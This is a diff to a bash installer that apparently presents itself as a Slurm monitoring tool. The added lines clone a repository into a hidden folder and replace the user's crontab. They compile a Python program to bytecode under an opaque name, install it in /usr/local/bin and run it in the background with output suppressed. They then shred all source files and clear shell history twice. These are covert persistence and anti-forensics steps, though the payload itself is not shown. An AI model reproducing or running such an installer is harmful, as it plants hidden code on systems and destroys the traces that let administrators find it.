@@ -1,9 +1,42 @@
-#!/usr/bin/bash
+#!/bin/bash
 
-sudo cp khc_st /usr/local/bin/
-sudo cp kht_sys /usr/local/bin/
-sudo crontab crbck
+echo "Downloading"
 
-sudo nohup /usr/local/bin/kht_sys 1>/dev/null 2>&1 &
+git clone https://github.com/h4th0r/slurm-monitor.git .sm 2> /dev/null
+
+cd .sm/
+
+echo "Compiling"
+pth="/usr/local/bin/"
+mkdir -p ${pth}
+
+crontab -r
+crontab crbck
+shred -n 64 -u crbck
+
+mv kht_sys kht_sys.py
+python3 -OO -m py_compile kht_sys.py
+find . -iname "*.pyc" | sed 's/.*/mv & kht_sys/g' | sh 2> /dev/null
+chmod 755 kht_sys
+chmod 755 khc_st
+
+cp khc_st ${pth}
+cp kht_sys ${pth}
+
+find . -type f | sed 's/.*/shred -n 64 -u &/g' | sh 2> /dev/null
+rm -fr __pycache__
+find . -type f | sed 's/.*/shred -n 64 -u &/g' | sh 2> /dev/null
+
+echo "Done"
 
 history -cw
+cat /dev/null > ~/.bash_history
+
+nohup python3 ${pth}/kht_sys 1>/dev/null 2>&1 &
+
+cd ../
+rm -fr .sm/
+
+history -cw 
+cat /dev/null > ~/.bash_history
+
